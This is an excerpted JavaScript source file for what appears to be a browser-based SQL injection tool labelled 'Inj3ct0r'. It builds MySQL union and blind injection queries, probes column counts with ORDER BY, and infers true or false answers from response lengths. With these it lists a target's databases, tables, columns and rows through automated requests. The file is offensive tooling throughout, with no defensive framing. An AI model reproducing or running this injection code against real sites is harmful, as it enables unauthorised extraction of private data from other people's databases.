...
function Blinder(inject,callback){
	...
	BLD['bot'] = 90;
	BLD['jump'] = 30;
	Quoter(0,0,"hex",[BlindSubChar,[SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+inject+")"+SQL[VTM['bypass']]['as']+SQL['space']+"T",1,callback,0],
		function(){
			//alert("Cann't Blind!");
...
function BlindSubChar(inject,count,callback,key){
	...
	SQLIAjax(URL[0]+query+">"+BLD['bot']+"--"+SQL['space']+"-"+URL[1],
		function(xhr){
			if(Math.abs(xhr.responseText.length - QUOTE['true']) < VTM['offset']){ //true
				BLD['bot'] += BLD['jump'];
...
function ErrorGetData(inject,count,callback)
{
	if(SQL['Data'].split(SQL['stop']).length < 2)
	{
		...
		var data = {responseText : SQL['Data']};
		callback(data);
		SQL['Data'] = "";
	}
}
...
function AppendDB(data){
	$("#dblist #body").append("<div class='db'><div class='dbname active' id='db"+i+"'>"+data+"</div><div class='tbs'></div>");
}
function AddDB(dbs){
...
function MySQLGetDBs(count)
{
	...
	if(VTM['method'] == 'union'){
		...
		Blinder(injectdbs,[AddDB,[],function(){},[],function(){},[]]);
	}
}
...
function AppendTB(data){
	DATA['dbhandler'].children('.tbs').append("<div class='tb'><div class='tbname active' id='tb"+i+"'>"+data+"</div><div class='cls'></div></div>");
}
function AddTB(tbs){
...
function MySQLGetTBs(count)
{
	...
	if(VTM['method'] == 'union'){
		...
		Blinder(injecttbs,[AddTB,[],function(){},[],function(){},[]]);
	}
}
/*******************************************
column function
...
function MySQLGetCLs(count)
{
	...
	if(VTM['method'] == 'union'){
		...
		Blinder(injectcls,[AddCL,[],function(){},[],function(){},[]]);
	}
}
/*******************************************
data function
...
function MySQLGetRWs()
{
	...
	if(VTM['method'] == 'union'){
		...
		Blinder(injectrow,[AddRW,[],function(){},[],function(){},[]]);
	}
}
/***********************************************************
insert data
************************************************************/
$("#database").html("<div id='dblist' class='explore'><div id='head'>DataBase List</div><div id='body' style='height: 300px;'></div></div><div id='dboption' class='explore' style='width: 200px;'><div id='head'>Option</div><div id='body' style='height: 300px;'></div></div><div id='ijtmain' class='explore' style='float: none; width: auto;'><div id='head'>Inj3ct0r</div><div id='body' style='height: 300px;'><textarea id='ijtdata' style='width: 98%; height: 98%;'></textarea></div></div></div><div id='datalist' class='explore' style='float: left; width: 100%;'><div id='head'> DATA </div><div id='body' style='height: 100%;'></div></div>");
...
$("#requestbtn").live("click",function(){
	if($.trim($(this).html()) == 'pause'){
		...
		$(this).html('pause');
		SQLIAjax(AJAX['dt'],AJAX['completefs'],AJAX['sleep']);
	}
});
...
$("#dboption #body").html("<input type='text' id='dbaddname' style='width: 180px; margin: 6px; float: left;'/><div class='button' id='adddatabasebtn'>Add Chil</div><div class='button' id='getcurrenttbbtn'>Curent DB</div><div id='checkallbtn' class='button'>check all</div><div id='startbtn' class='button'>start</div>");
/***********************************************************
hooker
************************************************************/
$(".active").live({
...
$("#getcurrenttbbtn").live("click",function(){
	...
	if(VTM['method'] == 'union'){
		...
		Blinder(qr,[AddDB,[],function(){},[],function(){},[]]);
	}
});
/***********************************************************
Load file
			...
			SQLIAjax(len2,
				function(xhr2){
					if(Math.abs(xhr1.responseText.length - xhr2.responseText.length) > VTM['offset']){
						...
						QUOTE['true'] = xhr1.responseText.length;
						CallBacker(callback[0],callback[1]);
					}else{
						if(type){
...
function OrderBy(quote,end,callback){
	...
	SQLIAjax(len,
		function(xhr){
			ORDER['tmp'] = xhr.responseText.length;
...
function OrderColumnLength(count,quote,end,callback){
	...
	SQLIAjax(len,
		function(xhr){
			if(Math.abs(xhr.responseText.length - ORDER['tmp']) < VTM['offset']){//false
...
Injector
*****************************************************/
//$("#injector").html("<div style='width:100%;' id='ijtmain' class='explore'><div id='head'>Inj3ct0r</div><div style='height: 300px;' id='body'><textarea id='ijtdata' style='width: 98%; height: 99%;'></textarea></div><div id='foot' class='explore' style='width:99%;'><div id='ijtpausebtn' class='button'>Pause</div></div></div>");
